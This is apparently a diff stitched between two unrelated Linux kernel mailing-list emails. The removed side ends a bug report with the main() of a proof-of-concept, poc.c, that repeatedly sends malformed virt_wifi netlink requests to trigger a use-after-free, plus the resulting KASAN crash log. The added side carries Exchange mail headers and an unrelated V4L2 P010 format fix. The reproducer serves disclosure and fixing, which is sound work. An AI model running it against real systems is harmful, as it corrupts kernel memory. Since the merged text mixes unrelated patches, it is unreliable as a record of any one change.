-static int read_sysfs_operstate(const char *ifname, char *buf, size_t buflen)
-{
-	char path[128];
-	FILE *f;
-	size_t n;
-
-	snprintf(path, sizeof(path), "/sys/class/net/%s/operstate", ifname);
-	f = fopen(path, "r");
-	if (!f)
-		return -1;
-	if (!fgets(buf, buflen, f)) {
-		fclose(f);
-		return -1;
-	}
-	fclose(f);
-	n = strlen(buf);
-	if (n && buf[n - 1] == '\n')
-		buf[n - 1] = '\0';
-	return 0;
-}
-
-int main(int argc, char **argv)
-{
-	char lower_name[IFNAMSIZ];
-	long attempts = 1024;
-	int fd;
-	int ifindex;
-	uint8_t operstate;
-	long i;
-
-	if (argc > 1) {
-		char *end;
-
-		errno = 0;
-		attempts = strtol(argv[1], &end, 0);
-		if (errno || *end != '\0' || attempts <= 0) {
-			fprintf(stderr, "invalid attempt count: %s\n", argv[1]);
-			return 1;
-		}
-	}
-
-	setvbuf(stdout, NULL, _IONBF, 0);
-	setvbuf(stderr, NULL, _IONBF, 0);
-
-	snprintf(lower_name, sizeof(lower_name), "vwlower%d", getpid());
-
-	fd = open_rtnl();
-	if (fd < 0) {
-		perror("open_rtnl");
-		return 1;
-	}
-
-	if (create_dummy(fd, lower_name) < 0) {
-		perror("create_dummy");
-		close(fd);
-		return 1;
-	}
-
-	ifindex = ifname_to_index(lower_name);
-	if (ifindex <= 0) {
-		perror("ifname_to_index");
-		close(fd);
-		return 1;
-	}
-
-	printf("created lower device %s (ifindex %d)\n", lower_name, ifindex);
-
-	if (set_link_up(fd, ifindex) < 0) {
-		perror("set_link_up");
-		close(fd);
-		return 1;
-	}
-
-	if (set_operstate(fd, ifindex, IF_OPER_DORMANT) < 0) {
-		perror("set_operstate");
-		close(fd);
-		return 1;
-	}
-
-	{
-		char oper_buf[32];
-
-		if (read_sysfs_operstate(lower_name, oper_buf, sizeof(oper_buf)) < 0)
-			printf("%s ifindex %d, sysfs operstate unavailable: %s\n",
-			       lower_name, ifindex, strerror(errno));
-		else
-			printf("%s ifindex %d, sysfs operstate: %s\n",
-			       lower_name, ifindex, oper_buf);
-	}
-	printf("triggering %ld virt_wifi registration failures with invalid ifname \"bad/name\"\n",
-	       attempts);
-
-	for (i = 1; i <= attempts; i++) {
-		if (trigger_virt_wifi_uaf(fd, ifindex) == 0) {
-			printf("[%ld] unexpectedly created virt_wifi device\n", i);
-			continue;
-		}
-
-		if (errno != EINVAL)
-			printf("[%ld] virt_wifi create error: %s\n",
-			       i, strerror(errno));
-
-		if ((i % 128) == 0)
-			printf("completed %ld attempts\n", i);
-	}
-
-	printf("waiting for linkwatch worker\n");
-	sleep(5);
-
-	close(fd);
-	return 0;
-}
-------END poc.c--------
-
-----BEGIN crash log----
-[    8.202464] net vwlower267: can't register_netdevice: -22
-[    8.203917] ==================================================================
-[    8.203925] BUG: KASAN: slab-use-after-free in __list_add_valid_or_report (lib/list_debug.c:32)
-[    8.203956] Read of size 8 at addr ffff888007024588 by task poc/267
-[    8.203958]
-[    8.203960] CPU: 1 UID: 0 PID: 267 Comm: poc Not tainted 7.2.0-g2f38e26a5741 #2 PREEMPT(lazy)
-[    8.203963] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[    8.203965] Call Trace:
-[    8.203966]  <TASK>
-[    8.203967]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
-[    8.203972]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
-[    8.203975]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:190)
-[    8.203979]  ? __list_add_valid_or_report (lib/list_debug.c:32)
-[    8.203981]  kasan_report (mm/kasan/report.c:595)
-[    8.203984]  ? __list_add_valid_or_report (lib/list_debug.c:32)
-[    8.203986]  __list_add_valid_or_report (lib/list_debug.c:32)
-[    8.203989]  linkwatch_fire_event (include/linux/list.h:419 (discriminator 2) net/core/link_watch.c:129 (discriminator 2) net/core/link_watch.c:329 (discriminator 2) net/core/link_watch.c:319 (discriminator 2))
-[    8.203992]  netif_stacked_transfer_operstate (include/linux/netdevice.h:4665 net/core/dev.c:11199)
-[    8.203996]  virt_wifi_newlink (drivers/net/wireless/virtual/virt_wifi.c:560)
-[    8.203999]  ? nla_strscpy (lib/nlattr.c:795)
-[    8.204003]  rtnl_newlink (net/core/rtnetlink.c:3969 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
-[    8.204005]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:2944)
-[    8.204008]  ? __pfx_stack_trace_consume_entry (usercopy_64.c:?)
-[    8.204011]  ? kernel_text_address (include/linux/kprobes.h:332 kernel/extable.c:123 kernel/extable.c:94)
-[    8.204014]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
-[    8.204017]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
-[    8.204020]  ? security_capable (security/security.c:660 (discriminator 8))
-[    8.204023]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:2944)
-[    8.204026]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
-[    8.204029]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1307 (discriminator 1))
-[    8.204032]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
-[    8.204035]  ? __pfx_rtnetlink_rcv_msg (include/net/netlink.h:1307 (discriminator 1))
-[    8.204038]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2718)
-[    8.204040]  ? __asan_memset (mm/kasan/shadow.c:84 (discriminator 1))
-[    8.204043]  ? _copy_from_iter (include/linux/instrumented.h:146 lib/iov_iter.c:66 include/linux/iov_iter.h:30 include/linux/iov_iter.h:302 include/linux/iov_iter.h:330 lib/iov_iter.c:261 lib/iov_iter.c:272)
-[    8.204046]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
-[    8.204048]  ? __pfx_netlink_unicast (arch/x86/include/asm/bitops.h:202)
-[    8.204051]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
-[    8.204053]  ? __pfx_netlink_sendmsg (include/net/net_namespace.h:422)
-[    8.204056]  ? _copy_from_user (include/linux/instrumented.h:146 include/linux/uaccess.h:184 lib/usercopy.c:18)
-[    8.204059]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
-[    8.204062]  ? __pfx_____sys_sendmsg (net/socket.c:1156)
-[    8.204064]  ? __pfx_copy_msghdr_from_user (net/socket.c:2619)
-[    8.204066]  ? __wake_up (include/linux/spinlock.h:425 kernel/sched/wait.c:128 kernel/sched/wait.c:147)
-[    8.204069]  ___sys_sendmsg (net/socket.c:2767)
-[    8.204071]  ? __pfx____sys_sendmsg (net/socket.c:2654)
-[    8.204074]  ? fdget (include/linux/instrumented.h:82 include/linux/atomic/atomic-instrumented.h:49 fs/file.c:1194 fs/file.c:1208)
-[    8.204077]  __sys_sendmsg (net/socket.c:2799)
-[    8.204079]  ? __pfx___sys_sendmsg (net/socket.c:2780)
-[    8.204089]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
-[    8.204092]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-[    8.204095] RIP: 0033:0x421534
-[    8.204097] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 f3 0f 1e fa 80 3d 2d 4b 09 00 00 74 13 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
-All code
-========
-   0:	c2 c0 ff             	ret    $0xffc0
-   3:	ff                   	(bad)
-   4:	ff f7                	push   %rdi
-   6:	d8 64 89 02          	fsubs  0x2(%rcx,%rcx,4)
-   a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
-  11:	eb b5                	jmp    0xffffffffffffffc8
-  13:	0f 1f 00             	nopl   (%rax)
-  16:	f3 0f 1e fa          	endbr64
-  1a:	80 3d 2d 4b 09 00 00 	cmpb   $0x0,0x94b2d(%rip)        # 0x94b4e
-  21:	74 13                	je     0x36
-  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
-  28:	0f 05                	syscall
-  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
-  30:	77 4c                	ja     0x7e
-  32:	c3                   	ret
-  33:	0f 1f 00             	nopl   (%rax)
-  36:	55                   	push   %rbp
-  37:	48 89 e5             	mov    %rsp,%rbp
-  3a:	48 83 ec 20          	sub    $0x20,%rsp
-  3e:	89                   	.byte 0x89
-  3f:	55                   	push   %rbp
-
-Code starting with the faulting instruction
-===========================================
-   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
-   6:	77 4c                	ja     0x54
-   8:	c3                   	ret
-   9:	0f 1f 00             	nopl   (%rax)
-   c:	55                   	push   %rbp
-   d:	48 89 e5             	mov    %rsp,%rbp
-  10:	48 83 ec 20          	sub    $0x20,%rsp
-  14:	89                   	.byte 0x89
-  15:	55                   	push   %rbp
-[    8.204099] RSP: 002b:00007fffc3b290d8 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
-[    8.204102] RAX: ffffffffffffffda RBX: 00007fffc3b2b1a0 RCX: 0000000000421534
-[    8.204103] RDX: 0000000000000000 RSI: 00007fffc3b29100 RDI: 0000000000000003
-[    8.204105] RBP: 0000000000000003 R08: 000000000000000e R09: 00007fcd7daeb000
-[    8.204106] R10: 0000000000000001 R11: 0000000000000202 R12: 00007fffc3b2b1a0
-[    8.204107] R13: 0000000000000004 R14: 0000000000000002 R15: 00007fffc3b2b1d8
-[    8.204109]  </TASK>
-[    8.204110]
-[    8.204110] Allocated by task 267:
-[    8.204112]  kasan_save_stack (mm/kasan/common.c:57)
-[    8.204114]  kasan_save_track (mm/kasan/common.c:78)
-[    8.204116]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
-[    8.204117]  __kvmalloc_node_noprof (include/linux/kasan.h:263 mm/slub.c:5414 mm/slub.c:7005)
-[    8.204120]  alloc_netdev_mqs (net/core/dev.c:12117 (discriminator 2))
-[    8.204123]  rtnl_create_link (net/core/rtnetlink.c:3777)
-[    8.204125]  rtnl_newlink (net/core/rtnetlink.c:3959 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
-[    8.204127]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
-[    8.204129]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
-[    8.204131]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
-[    8.204133]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
-[    8.204135]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
-[    8.204137]  ___sys_sendmsg (net/socket.c:2767)
-[    8.204139]  __sys_sendmsg (net/socket.c:2799)
-[    8.204140]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
-[    8.204142]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-[    8.204144]
-[    8.204144] Freed by task 267:
-[    8.204145]  kasan_save_stack (mm/kasan/common.c:57)
-[    8.204146]  kasan_save_track (mm/kasan/common.c:78)
-[    8.204148]  kasan_save_free_info (mm/kasan/generic.c:584)
-[    8.204150]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
-[    8.204152]  kfree (include/linux/kasan.h:235 mm/slub.c:2748 mm/slub.c:6499 mm/slub.c:6792)
-[    8.204154]  rtnl_newlink (net/core/rtnetlink.c:3973 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
-[    8.204155]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
-[    8.204157]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
-[    8.204160]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
-[    8.204162]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
-[    8.204164]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
-[    8.204166]  ___sys_sendmsg (net/socket.c:2767)
-[    8.204167]  __sys_sendmsg (net/socket.c:2799)
-[    8.204168]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
-[    8.204170]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-[    8.204172]
-[    8.204172] The buggy address belongs to the object at ffff888007024000
-[    8.204172]  which belongs to the cache kmalloc-4k of size 4096
-[    8.204174] The buggy address is located 1416 bytes inside of
-[    8.204174]  freed 4096-byte region [ffff888007024000, ffff888007025000)
-[    8.204176]
-[    8.204177] The buggy address belongs to the physical page:
-[    8.204178] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x7020
-[    8.204180] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
-[    8.204181] flags: 0x100000000000040(head|node=0|zone=1)
-[    8.204184] page_type: f5(slab)
-[    8.204186] raw: 0100000000000040 ffff8880010433c0 ffffea00001c1210 ffffea00001c3c10
-[    8.204188] raw: 0000000000000000 0000000000020002 00000000f5000000 0000000000000000
-[    8.204190] head: 0100000000000040 ffff8880010433c0 ffffea00001c1210 ffffea00001c3c10
-[    8.204191] head: 0000000000000000 0000000000020002 00000000f5000000 0000000000000000
-[    8.204193] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 00000000ffffffff
-[    8.204194] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
-[    8.204195] page dumped because: kasan: bad access detected
-[    8.204196]
-[    8.204196] Memory state around the buggy address:
-[    8.204197]  ffff888007024480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[    8.204199]  ffff888007024500: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[    8.204200] >ffff888007024580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[    8.204201]                       ^
-[    8.204202]  ffff888007024600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[    8.204203]  ffff888007024680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[    8.204204] ==================================================================
-[    8.204205] Disabling lock debugging due to kernel taint
------END crash log-----
-
-Best regards,
-Zihan Xi
-
-Zihan Xi (1):
-  net: fix linkwatch UAF on uninitialized netdev
-
- net/core/link_watch.c | 7 ++++++-
- 1 file changed, 6 insertions(+), 1 deletion(-)
-
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: SL2P216MB2441:EE_|SEWP216MB2979:EE_
+X-MS-Office365-Filtering-Correlation-Id: 9a70964d-e7c4-4492-7f00-08df0a504cfa
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam:
+	BCL:0;ARA:13230040|376014|1800799024|7416014|23010399003|52116014|366016|38350700014|10067099003|18002099003|22082099003|56012099006;
+X-Microsoft-Antispam-Message-Info:
+	gHTjrpqO3swuOautZ++epOYWGXdFUgz9+X3pNUTx4vLUugFdqUdxMFxVBHNgMImguWCSNCoGRp5bdOrOfgVYkgUWL0r5nBmpxXZIpjBwpBjYjckjJ2FusbdwGZL/E3l7mMMve7mRM1yx+9yIKFSBSaIZPKCCphKTEkr6MYd1w/yFwJHQGVlTWXT45mhFX2Jqir9K850EreQ67GQDPx+pTUX+QvxPYB2K7C+9isC0VLF35Fp7ewFp0OXeAoJgT7/p1TuB4VHXmex4I/q3cCh99Yf9vjTxOVywsAZV3TrirUqddHekn/F3vJEjxY7xmMuO6hmF6t/Si+4bO+ugGK+xFBJJQid91BkR4xBJ3U6uXjYFrkDG+stSIxmQQaRkd7Lorag3dm7YpC5artniMR4PZA5LEmWE8HcNQu2K4ssBP8pbqQVl3Njl6ZFFDTmLLi2OBp48HbC5ZM4OsZIviG2XrjTApXlof/wlRad8Sv25gQcgMi35L0FSl+NHAO8FJfxnYjYBG9CSN7jR5Kai82a1cAH3m4AkhZPAirFxOQXigyMLV5Dm40J5wcSWHnkn8gqdCyT8VUE024vs4k0eWfRz+xQ/0Py/jCTY1lYuO7T23bubyUGap72sAVDFnHvBwZpGJC0RRv5NEdO4/v/G0ulofvhMORlXd0FI8uxcu1Nf42aLRY2f6ygFfI7SeQbR12NZyDS+31ZMNQO2ILOjAjJ/DOPck498a/tUiL1jj8wMZbw=
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SL2P216MB2441.KORP216.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(7416014)(23010399003)(52116014)(366016)(38350700014)(10067099003)(18002099003)(22082099003)(56012099006);DIR:OUT;SFP:1102;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?us-ascii?Q?HrGay/3KuCqHTQnh8HTmXNnPPj2vR3YydUVPxCuRRxH2U23lcPdOg28z/Cug?=
+ =?us-ascii?Q?VxqLYJotJ5RmRxYhRRTCM4L8n+y35YCjsrXTrKYCw4HYbFN8x7/DxfD+5pqP?=
+ =?us-ascii?Q?zUVBVVXjkGB/uqzKWL7x6cbxTpsxjbOx4vCNifvyp0moE98AeV/p1qN+D3m2?=
+ =?us-ascii?Q?j3Ovj5oSsJpT9L/3x3R0yK4Xe7wa0JFRFegqH8z+zoP3w5FegH7OE9xtZlMe?=
+ =?us-ascii?Q?TM70v7KvdruyH1Hxtv5L3Rox99UWW7oXV7ctjPwjLcSEZ6dS5goCoLC1y0CS?=
+ =?us-ascii?Q?eUnFJG2M7s+qFZlOldEmeJ2fY7Mph8y27xMDLhH+hallj9XJa9xOkr9jSX9B?=
+ =?us-ascii?Q?JoTGK79mnaVThlPaAN/8OwKPTm1iw8tb7XDq7K3tIMGr0U2aS5G98JteoX3h?=
+ =?us-ascii?Q?24zbfVwHixTq1odMDkQRQ6YdXq/8DTqO2zuC4L/KpU7/3F4T9odAvHBZguMv?=
+ =?us-ascii?Q?2+sp6o4SP+SqEqbNP0jmtAbW1f6sH/oVMcho9TlhDdc/2ZGENZRnBdjET8bY?=
+ =?us-ascii?Q?eGZhL1mHgaYiACsPs5A6i+//2G+NzrnZ5OT8JU0JxXRJPb+5U6GTF+iAzfp8?=
+ =?us-ascii?Q?VOpryfrVdK2FQA4ErSLcevLV4R7x5YfQnKg3kat1uxbHgQy2t1lSVLt7Q6Yq?=
+ =?us-ascii?Q?jtHmfGFw2P9GAVV5FkDPVGYwtOYLtIAOL1BwO5UerhPm6zBrDcXSIB2dm5UF?=
+ =?us-ascii?Q?nl2m970EVv0/YGkmpBIJ8GSeA1uxsRbvlDaIeehcLyb7+SVbEj7iCSm+Xbjy?=
+ =?us-ascii?Q?XOD0nFntmbINQAYHp/uKI6kcGxe51oW0+CWv8OFvbArzSXlw0RpolDW9w9n7?=
+ =?us-ascii?Q?QoDplqjqaiROoTTl2I4Ul4GmWB4filK9iN7mWGopG0k2TJ+7QcKYPYrZQBKh?=
+ =?us-ascii?Q?SVZOGle7mCDYGJQIBXPSZQtWb59dMHpXlYCop86ZW3OGYnsqnIuEjyvd6OSk?=
+ =?us-ascii?Q?a3bhLEL5GV8rdXz5MagXGLly4O/3iH2SBWADRirQa7ttq3BnysRS+iAhbqfQ?=
+ =?us-ascii?Q?yYxsRKI4KnsRhpGOyC/cxaxvZtH/afEcXq7YZAlU/VE1CYRx5Fs0QgROnzk7?=
+ =?us-ascii?Q?1gJ2OKeg3r421ut9HJuR0O7IRVz8LDrM6unTE62b+kFCWlAWLIt+jYK1MR0c?=
+ =?us-ascii?Q?EYMIHx3uJnW4xlFtLJf7opPPhEOsORnarEClKruX+/kJz+TL617Ngln+/VsT?=
+ =?us-ascii?Q?Hpj74+plHISRlEU1hJp3T6ybaSHyHQWNGRVzzGiqmDWcZf7qQdIAeZYgmZVb?=
+ =?us-ascii?Q?KsYdyJgsihPgHKR7FR6MyRnOzzy3bTcRNXQpI9Qz3EVhJejPd9htYrok6Wp6?=
+ =?us-ascii?Q?APtyDpikimpnjGs3y4zqvASaIpW0bUPBywnofKKtHDDMyfszpHm99q0anRgj?=
+ =?us-ascii?Q?SWyYF5adXllVkf8BGiI2hr9+E2nOdslgiz7ytM6/RQG89mYKSEzp5CELPMhd?=
+ =?us-ascii?Q?cWsdz/WTvNTz0bz+ZfnZCiY7YmtumG3wnqTW/ZBrwqYqJoEZ6tmR/dr+dDs2?=
+ =?us-ascii?Q?Lxag4V33yw8uBJldmIYdeERwfmFwPma/vuXes4Jmt0cDlv4557sjJnMTSVro?=
+ =?us-ascii?Q?6WW2i26V+uPiAictej7bgwLwxmTGpu33aigaIdodM2Lh6xURTl0ddxF4sNuN?=
+ =?us-ascii?Q?zybs0O6cILEHoZcB2aTG35i6cGADBjKIy41M4hJFvqUyJMmXEeaeO+PzWeE7?=
+ =?us-ascii?Q?PDBxX6ITg2THN1t7TAk3W2KF5EzbeUfR3TI/yPmnzJNnOPSBC37/J77Rtn22?=
+ =?us-ascii?Q?CP5dc8SAbsT3n8UgCz+Q+xyFgRDEYDE=3D?=
+X-OriginatorOrg: chipsnmedia.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 9a70964d-e7c4-4492-7f00-08df0a504cfa
+X-MS-Exchange-CrossTenant-AuthSource: SL2P216MB2441.KORP216.PROD.OUTLOOK.COM
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 04 Sep 2026 06:46:51.6567
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 4d70c8e9-142b-4389-b7f2-fa8a3c68c467
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: /1eYd+GhgBNRwfOWelXibClGnnUprvAQHkGuYYkrhifjoe8SVU5srV1mHnprOCdkymRji4ReflSV/b72Ljmiaxr33CXofLe/Ua89S6+mFlE=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: SEWP216MB2979
+
+V4L2_PIX_FMT_P010 is a 10-bit 4:2:0 semi-planar format, but its
+v4l2_format_info() entry described a 4:2:2 layout with a half-width
+chroma plane. Correct bpp and vdiv to match P010's real layout,
+consistent with the other semi-planar formats.
+
+Fixes: 5374d8fb75f3 ("media: Add P010 video format")
+Signed-off-by: Nas Chung <nas.chung@chipsnmedia.com>
+---
+ drivers/media/v4l2-core/v4l2-common.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+diff --git a/drivers/media/v4l2-core/v4l2-common.c b/drivers/media/v4l2-core/v4l2-common.c
+index 65db7340ad38..4de8aa3ef7d2 100644
+--- a/drivers/media/v4l2-core/v4l2-common.c
++++ b/drivers/media/v4l2-core/v4l2-common.c
+@@ -323,7 +323,7 @@ const struct v4l2_format_info *v4l2_format_info(u32 format)
+ 		{ .format = V4L2_PIX_FMT_NV20,    .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 2, .bpp = { 5, 10, 0, 0 }, .bpp_div = { 4, 4, 1, 1 }, .hdiv = 2, .vdiv = 1 },
+ 		{ .format = V4L2_PIX_FMT_NV24,    .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 2, .bpp = { 1, 2, 0, 0 }, .bpp_div = { 1, 1, 1, 1 }, .hdiv = 1, .vdiv = 1 },
+ 		{ .format = V4L2_PIX_FMT_NV42,    .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 2, .bpp = { 1, 2, 0, 0 }, .bpp_div = { 1, 1, 1, 1 }, .hdiv = 1, .vdiv = 1 },
+-		{ .format = V4L2_PIX_FMT_P010,    .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 2, .bpp = { 2, 2, 0, 0 }, .bpp_div = { 1, 1, 1, 1 }, .hdiv = 2, .vdiv = 1 },
++		{ .format = V4L2_PIX_FMT_P010,    .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 2, .bpp = { 2, 4, 0, 0 }, .bpp_div = { 1, 1, 1, 1 }, .hdiv = 2, .vdiv = 2 },
+ 		{ .format = V4L2_PIX_FMT_P012,    .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 2, .bpp = { 2, 4, 0, 0 }, .bpp_div = { 1, 1, 1, 1 }, .hdiv = 2, .vdiv = 2 },
+ 
+ 		{ .format = V4L2_PIX_FMT_YUV410,  .pixel_enc = V4L2_PIXEL_ENC_YUV, .mem_planes = 1, .comp_planes = 3, .bpp = { 1, 1, 1, 0 }, .bpp_div = { 1, 1, 1, 1 }, .hdiv = 4, .vdiv = 4 },
 -- 
-2.43.0
+2.31.1
 
